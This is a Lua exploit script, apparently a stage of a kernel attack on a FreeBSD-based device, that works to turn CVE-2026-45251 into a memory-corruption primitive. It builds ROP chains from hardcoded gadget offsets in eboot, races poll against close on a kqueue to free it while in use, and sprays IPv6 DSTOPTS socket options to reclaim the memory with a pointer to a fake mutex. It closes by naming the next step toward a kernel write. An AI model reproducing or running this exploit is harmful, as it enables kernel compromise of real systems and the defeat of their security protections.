-- CRASH_CLASS: HIGH
-- PROBE 500f: kqueue cross-zone reclaim via IPv6 sockopt spray (CVE-2026-45251)
--
-- 500c: race confirmed live (150/150, poll=0/rev=0x0, seldrain missing)
-- 500d: same-type socket spray reclaims UMA zone but is benign (clean selinfo)
-- 500e: double-poll confusion also benign (TAILQ_REMOVE idempotent)
--
-- Key insight: kqueue uses malloc(M_KQUEUE) = GENERAL allocator, not UMA zone.
-- ANY malloc of the same size class can reclaim the freed kqueue.
-- setsockopt(IPV6_DSTOPTS) does malloc(N, M_IP6OPT) with controlled content.
--
-- Strategy:
-- 1. Child A polls kqueue fd → blocks in kernel
-- 2. Child B closes kqueue fd → free(kq, M_KQUEUE) → general 256B zone
-- 3. Main thread sprays 60× IPv6 setsockopt(DSTOPTS, 248B) → same zone
-- 4. Spray content = &fake_mtx (valid userland mutex if SMAP off)
-- 5. Poll timeout → seltdclear reads si_mtx from spray → mtx_lock(spray_value)
--
-- Outcomes:
-- - Process survives + getsockopt shows modification → SMAP off, spray confirmed
-- - Process dies → spray confirmed, SMAP on (kernel panic at &fake_mtx)
-- - Process survives, no modification → spray didn't reclaim (try other size)

print("=== PROBE 500f: KQUEUE CROSS-ZONE RECLAIM (CVE-2026-45251) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_pop_rcx = eb + 0xE64
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

local fake_tcb = memory.alloc(0x1000)
for i = 0, 0xFFC, 8 do wq(N(fake_tcb) + i, uint64(N(fake_tcb))) end
local tcb_ptr = memory.alloc(8)
wq(N(tcb_ptr), uint64(N(fake_tcb)))

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

local function make_gate()
    local sv = memory.alloc(8)
    wd(N(sv), 0xFFFF); wd(N(sv) + 4, 0xFFFF)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sv))) end)
    local r = rd(N(sv)) or 0xFFFF
    local w = rd(N(sv) + 4) or 0xFFFF
    if r == 0xFFFF or w == 0xFFFF then return nil, nil end
    return r, w
end

local one_byte = memory.alloc(8)
wd(N(one_byte), 0x42)

-- ========== Section A: IPv6 setsockopt spray feasibility ==========
print("")
print("--- A: IPv6 spray feasibility ---")

local sc_socket = mk(97)
local sc_sso = mk(54)
local sc_gso = mk(55)
local sc_close = mk(6)
local sc_kqueue = mk(362)

local s6_test = sgn(sc_socket(uint64(28), uint64(2), uint64(17)))
print("A1: IPv6 UDP socket fd=" .. s6_test)

if s6_test < 0 then
    print("A: IPv6 sockets NOT available, aborting")
    print("=== 500f COMPLETE (no spray vector) ===")
    return
end

local spray_opt = nil

local function try_sso(sock, optname, optlen, label)
    local buf = memory.alloc(optlen + 16)
    -- Build valid IPv6 extension header:
    -- byte 0: ip6d_nxt=0, byte 1: hdr_ext_len=(optlen/8)-1
    -- remaining: arbitrary (kernel only validates length match)
    local hdr_ext_len = (optlen / 8) - 1
    -- little-endian dword: byte0=0x00, byte1=hdr_ext_len, byte2=0x01(PadN), byte3=optlen-4
    local dw0 = 0 + (hdr_ext_len * 256) + (1 * 65536) + ((optlen - 4) * 16777216)
    wd(N(buf), dw0)
    wd(N(buf) + 4, 0)
    for i = 8, optlen - 1, 8 do wq(N(buf) + i, uint64(0x4242424242424242)) end
    -- IPPROTO_IPV6 = 41
    local ret = sgn(sc_sso(uint64(sock), uint64(41), uint64(optname),
        uint64(N(buf)), uint64(optlen)))
    print(string.format("  %s(opt=%d, %dB) = %d", label, optname, optlen, ret))
    return ret
end

-- Try FreeBSD 11 option numbers: HOPOPTS=49, DSTOPTS=50, RTHDR=51
local opts = {
    {name="HOPOPTS", num=49},
    {name="DSTOPTS", num=50},
    {name="RTHDR",   num=51},
}

for _, opt in ipairs(opts) do
    local ret = try_sso(s6_test, opt.num, 248, opt.name)
    if ret == 0 then
        spray_opt = opt
        print("  >>> " .. opt.name .. " WORKS <<<")
        break
    end
end

-- Also try 120B for 128B zone coverage
local spray_120_works = false
if spray_opt then
    local ret = try_sso(s6_test, spray_opt.num, 120, spray_opt.name .. "_120B")
    spray_120_works = (ret == 0)
end

-- Verify getsockopt reads back the data
if spray_opt then
    local rb = memory.alloc(256)
    local rlen = memory.alloc(8)
    wd(N(rlen), 248)
    for i = 0, 252, 4 do wd(N(rb) + i, 0) end
    local gret = sgn(sc_gso(uint64(s6_test), uint64(41), uint64(spray_opt.num),
        uint64(N(rb)), uint64(N(rlen))))
    local got_len = rd(N(rlen)) or 0
    local sample = rq(uint64(N(rb) + 16))
    print(string.format("  getsockopt ret=%d len=%d sample@16=%s", gret, got_len, fmt(sample)))
end

pcall(function() sc_close(uint64(s6_test)) end)

if not spray_opt then
    print("A: NO IPv6 extension option works — need alternative spray")
    print("=== 500f COMPLETE (no spray vector) ===")
    return
end

-- ========== Section B: Fake mutex + spray buffers ==========
print("")
print("--- B: setup ---")

-- Fake mutex for SMAP-off scenario
-- struct mtx: lock_object(16B) + mtx_lock(8B at +0x10)
-- mtx_lock = MTX_UNOWNED = 0x4 on FreeBSD 11
local fake_mtx = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(fake_mtx) + i, 0) end
wq(N(fake_mtx), uint64(N(fake_mtx) + 0x20))  -- lo_name (don't-care but valid ptr)
wq(N(fake_mtx) + 0x10, uint64(4))              -- mtx_lock = MTX_UNOWNED
print("B1: fake_mtx=" .. fmt(uint64(N(fake_mtx))) .. " (mtx_lock@+0x10=0x4)")

-- Build spray buffers
local function build_spray_buf(optlen, fill_qword)
    local buf = memory.alloc(optlen + 16)
    local hdr_ext_len = (optlen / 8) - 1
    local dw0 = 0 + (hdr_ext_len * 256) + (1 * 65536) + ((optlen - 4) * 16777216)
    wd(N(buf), dw0)
    -- bytes 4-7: low 32 bits of fill
    wd(N(buf) + 4, N(fill_qword))
    -- bytes 8+: full qwords
    for i = 8, optlen - 1, 8 do
        wq(N(buf) + i, fill_qword)
    end
    return buf
end

local spray248 = build_spray_buf(248, uint64(N(fake_mtx)))
local spray120 = build_spray_buf(120, uint64(N(fake_mtx)))
print("B2: spray buffers ready (248B/120B, fill=" .. fmt(uint64(N(fake_mtx))) .. ")")

-- ========== Section C: Child thread builders ==========

local function build_poller(gate_rd, pollfd_addr, marker_addr)
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    -- sysarch(SET_FSBASE=129, &fake_tcb)
    emit(g_pop_rdi); emit(uint64(129))
    emit(g_pop_rsi); emit(uint64(N(tcb_ptr)))
    emit(g_pop_rax); emit(uint64(165)); emit(stub)
    -- read(gate_rd, buf, 1) — blocks until gate opens
    emit(g_pop_rdi); emit(uint64(gate_rd))
    emit(g_pop_rsi); emit(uint64(N(one_byte)))
    emit(g_pop_rdx); emit(uint64(1))
    emit(g_pop_rax); emit(uint64(3)); emit(stub)
    -- poll(pollfd, 1, 3000)
    emit(g_pop_rdi); emit(uint64(pollfd_addr))
    emit(g_pop_rsi); emit(uint64(1))
    emit(g_pop_rdx); emit(uint64(3000))
    emit(g_pop_rax); emit(uint64(209)); emit(stub)
    -- write result to marker
    emit(g_pop_rdi); emit(uint64(marker_addr))
    emit(g_mov_m_rax)
    -- thr_exit(0)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431)); emit(stub)
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    return par
end

local function build_closer(gate_rd, target_fd, marker_addr)
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    emit(g_pop_rdi); emit(uint64(129))
    emit(g_pop_rsi); emit(uint64(N(tcb_ptr)))
    emit(g_pop_rax); emit(uint64(165)); emit(stub)
    emit(g_pop_rdi); emit(uint64(gate_rd))
    emit(g_pop_rsi); emit(uint64(N(one_byte)))
    emit(g_pop_rdx); emit(uint64(1))
    emit(g_pop_rax); emit(uint64(3)); emit(stub)
    -- close(target_fd)
    emit(g_pop_rdi); emit(uint64(target_fd))
    emit(g_pop_rax); emit(uint64(6)); emit(stub)
    -- write result to marker
    emit(g_pop_rdi); emit(uint64(marker_addr))
    emit(g_mov_m_rax)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431)); emit(stub)
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    return par
end

-- ========== Section D: Control race (no spray) ==========
print("")
print("--- D: control race (no spray, must survive) ---")

local function run_control()
    local kq = sgn(sc_kqueue())
    if kq < 0 then print("  kqueue fail=" .. kq); return nil end

    local gA_r, gA_w = make_gate()
    local gB_r, gB_w = make_gate()
    if not gA_r or not gB_r then
        print("  gate fail")
        pcall(function() sc_close(uint64(kq)) end)
        return nil
    end

    local pollfd = memory.alloc(8)
    wd(N(pollfd), kq)
    wd(N(pollfd) + 4, 0x00010000)

    local mA = memory.alloc(8); wq(N(mA), uint64(0xAAAAAAAA))
    local mB = memory.alloc(8); wq(N(mB), uint64(0xBBBBBBBB))

    local parA = build_poller(gA_r, N(pollfd), N(mA))
    pcall(function() mk(455)(parA, uint64(0x38)) end)
    local parB = build_closer(gB_r, kq, N(mB))
    pcall(function() mk(455)(parB, uint64(0x38)) end)

    -- gate A: poller enters poll
    pcall(function() mk(4)(uint64(gA_w), uint64(N(one_byte)), uint64(1)) end)
    for d = 1, 30000 do local _ = rd(N(mA)) end
    -- gate B: closer fires
    pcall(function() mk(4)(uint64(gB_w), uint64(N(one_byte)), uint64(1)) end)

    -- wait for both
    for w = 1, 6000000 do
        local a = rd(N(mA)); local b = rd(N(mB))
        if a and a ~= 0xAAAAAAAA and b and b ~= 0xBBBBBBBB then break end
    end

    if not alive() then return "died" end

    local poll_rv = rd(N(mA)) or 0xAA
    local raw = rd(N(pollfd) + 4) or 0
    local revents = math.floor(raw / 65536) % 65536

    pcall(function() sc_close(uint64(gA_r)) end)
    pcall(function() sc_close(uint64(gA_w)) end)
    pcall(function() sc_close(uint64(gB_r)) end)
    pcall(function() sc_close(uint64(gB_w)) end)

    return string.format("poll=%d/rev=0x%X", poll_rv, revents)
end

for ci = 1, 3 do
    if not alive() then break end
    local r = run_control()
    print(string.format("  control %d: %s", ci, tostring(r)))
    if r == "died" then
        print("  *** CONTROL DIED — race itself is lethal, cannot test spray ***")
        print("=== 500f COMPLETE ===")
        return
    end
end
print("  control OK — process survives race without spray")

-- ========== Section E: Spray race ==========

local function run_spray_race(spray_len, spray_buf, spray_count, label)
    print("[" .. label .. "] spray=" .. spray_count .. " × " .. spray_len .. "B")

    local kq = sgn(sc_kqueue())
    if kq < 0 then print("  kqueue fail=" .. kq); return nil end
    print("  kq_fd=" .. kq)

    local gA_r, gA_w = make_gate()
    local gB_r, gB_w = make_gate()
    if not gA_r or not gB_r then
        print("  gate fail")
        pcall(function() sc_close(uint64(kq)) end)
        return nil
    end

    local pollfd = memory.alloc(8)
    wd(N(pollfd), kq)
    wd(N(pollfd) + 4, 0x00010000)

    local mA = memory.alloc(8); wq(N(mA), uint64(0xAAAAAAAA))
    local mB = memory.alloc(8); wq(N(mB), uint64(0xBBBBBBBB))

    -- Reset fake_mtx lock word before each iteration
    wq(N(fake_mtx) + 0x10, uint64(4))

    local parA = build_poller(gA_r, N(pollfd), N(mA))
    pcall(function() mk(455)(parA, uint64(0x38)) end)
    local parB = build_closer(gB_r, kq, N(mB))
    pcall(function() mk(455)(parB, uint64(0x38)) end)

    -- Gate A: poller enters poll and blocks
    pcall(function() mk(4)(uint64(gA_w), uint64(N(one_byte)), uint64(1)) end)
    for d = 1, 30000 do local _ = rd(N(mA)) end

    -- Gate B: closer frees the kqueue
    pcall(function() mk(4)(uint64(gB_w), uint64(N(one_byte)), uint64(1)) end)

    -- Wait for close to complete
    for w = 1, 200000 do
        local b = rd(N(mB))
        if b and b ~= 0xBBBBBBBB then break end
    end

    if not alive() then
        print("  *** DIED after close (before spray) ***")
        return "died_close"
    end

    -- SPRAY: create IPv6 sockets with controlled option data
    local spray_fds = {}
    local spray_ok = 0
    for s = 1, spray_count do
        local s6 = sgn(sc_socket(uint64(28), uint64(2), uint64(17)))
        if s6 > 0 then
            local ret = sgn(sc_sso(uint64(s6), uint64(41), uint64(spray_opt.num),
                uint64(N(spray_buf)), uint64(spray_len)))
            if ret == 0 then
                spray_ok = spray_ok + 1
                spray_fds[#spray_fds + 1] = s6
            else
                pcall(function() sc_close(uint64(s6)) end)
            end
        end
    end
    print("  spray: " .. spray_ok .. "/" .. spray_count .. " set")

    if not alive() then
        print("  *** DIED during spray ***")
        return "died_spray"
    end

    -- Wait for poll timeout (~3s) → seltdclear runs
    print("  waiting for poll timeout (~3s)...")
    local a_done = false
    for w = 1, 8000000 do
        if not alive() then break end
        local a = rd(N(mA))
        if a and a ~= 0xAAAAAAAA then a_done = true; break end
    end

    if not alive() then
        print("  *** PROCESS DIED during seltdclear ***")
        print("  >>> CROSS-ZONE RECLAIM CONFIRMED <<<")
        print("  >>> seltdclear read si_mtx from spray data <<<")
        print("  >>> (SMAP likely active — kernel panicked on userland ptr) <<<")
        return "died_seltdclear"
    end

    local poll_rv = rd(N(mA)) or 0xAA
    local raw = rd(N(pollfd) + 4) or 0
    local revents = math.floor(raw / 65536) % 65536
    print(string.format("  poll_rv=%d revents=0x%X a_done=%s", poll_rv, revents, tostring(a_done)))

    -- Check fake_mtx: was mtx_lock touched?
    local mtx_val = rq(uint64(N(fake_mtx) + 0x10))
    print("  fake_mtx.mtx_lock=" .. fmt(mtx_val) .. " (4=unused, other=was_locked)")

    -- getsockopt each spray socket: check for modifications
    local hit_count = 0
    local rb = memory.alloc(spray_len + 16)
    local rlen_p = memory.alloc(8)

    for idx, sfd in ipairs(spray_fds) do
        wd(N(rlen_p), spray_len)
        for i = 0, spray_len - 1, 4 do wd(N(rb) + i, 0) end

        local gret = sgn(sc_gso(uint64(sfd), uint64(41), uint64(spray_opt.num),
            uint64(N(rb)), uint64(N(rlen_p))))

        if gret == 0 then
            local changes = {}
            -- Compare qwords 1..N (skip qword 0 = header)
            for off = 8, spray_len - 8, 8 do
                local orig = rq(uint64(N(spray_buf) + off))
                local got = rq(uint64(N(rb) + off))
                local oh, ol = get_hi_lo(orig)
                local gh, gl = get_hi_lo(got)
                if oh ~= gh or ol ~= gl then
                    changes[#changes + 1] = string.format("+0x%02X: %s -> %s", off, fmt(orig), fmt(got))
                end
            end
            if #changes > 0 then
                hit_count = hit_count + 1
                print(string.format("  *** HIT socket #%d (fd=%d): %d modified qwords ***", idx, sfd, #changes))
                for _, c in ipairs(changes) do
                    print("    " .. c)
                end
            end
        end
    end

    -- Cleanup spray sockets
    for _, sfd in ipairs(spray_fds) do
        pcall(function() sc_close(uint64(sfd)) end)
    end
    pcall(function() sc_close(uint64(gA_r)) end)
    pcall(function() sc_close(uint64(gA_w)) end)
    pcall(function() sc_close(uint64(gB_r)) end)
    pcall(function() sc_close(uint64(gB_w)) end)

    if hit_count > 0 then
        print("  >>> RECLAIM CONFIRMED: " .. hit_count .. " socket(s) modified <<<")
        print("  >>> SMAP OFF — seltdclear used fake_mtx successfully <<<")
        return "hit"
    else
        print("  no modifications — spray didn't reclaim this zone")
        return "miss"
    end
end

-- ========== Run spray races ==========
print("")
print("--- E: 256B zone target (248B spray) ---")

local SPRAY_N = 60
local got_hit = false

for iter = 1, 3 do
    if not alive() then break end
    print(string.format("\n[256B iter %d/3]", iter))
    local result = run_spray_race(248, spray248, SPRAY_N, "zone-256")
    if result == "hit" or result == "died_seltdclear" then
        got_hit = true
        if result == "hit" then
            print("=== 256B ZONE: RECLAIM CONFIRMED (SMAP OFF) ===")
        end
        break
    elseif result and result:match("died") then
        print("=== DIED: " .. result .. " ===")
        got_hit = true
        break
    end
end

if alive() and not got_hit then
    print("")
    print("--- F: 128B zone target (120B spray) ---")
    for iter = 1, 3 do
        if not alive() then break end
        print(string.format("\n[128B iter %d/3]", iter))
        local result = run_spray_race(120, spray120, SPRAY_N, "zone-128")
        if result == "hit" or result == "died_seltdclear" then
            got_hit = true
            if result == "hit" then
                print("=== 128B ZONE: RECLAIM CONFIRMED (SMAP OFF) ===")
            end
            break
        elseif result and result:match("died") then
            print("=== DIED: " .. result .. " ===")
            got_hit = true
            break
        end
    end
end

-- Also try 64B and 512B zones if nothing hit
if alive() and not got_hit then
    print("")
    print("--- G: 512B zone (504B spray) ---")
    local spray504 = build_spray_buf(504, uint64(N(fake_mtx)))
    -- Quick test: does 504B setsockopt work?
    local ts = sgn(sc_socket(uint64(28), uint64(2), uint64(17)))
    if ts > 0 then
        local tret = sgn(sc_sso(uint64(ts), uint64(41), uint64(spray_opt.num),
            uint64(N(spray504)), uint64(504)))
        print("  504B setsockopt=" .. tret)
        pcall(function() sc_close(uint64(ts)) end)
        if tret == 0 then
            for iter = 1, 2 do
                if not alive() then break end
                print(string.format("\n[512B iter %d/2]", iter))
                local result = run_spray_race(504, spray504, SPRAY_N, "zone-512")
                if result == "hit" or (result and result:match("died")) then
                    got_hit = true; break
                end
            end
        end
    end
end

print("")
print("========================================")
if not alive() then
    print("*** DEAD — seltdclear crash confirms cross-zone reclaim ***")
    print("*** CVE-2026-45251 EXPLOITATION CONFIRMED ***")
elseif got_hit then
    print("RECLAIM CONFIRMED — spray data was modified by seltdclear")
    print("CVE-2026-45251 EXPLOITATION CONFIRMED (SMAP off)")
    print("Next: forge si_mtx → controlled TAILQ_REMOVE → kernel write")
else
    print("ALIVE but no hit — spray didn't reclaim at 128/256/512B zones")
    print("Try: more spray (100+), knote spray via kevent, or kqueue-create spray")
end
print("canary=" .. (alive() and N(native.fcall_with_rax(stub, 20)) or "DEAD"))
print("========================================")
print("")
print("=== PROBE 500f COMPLETE ===")
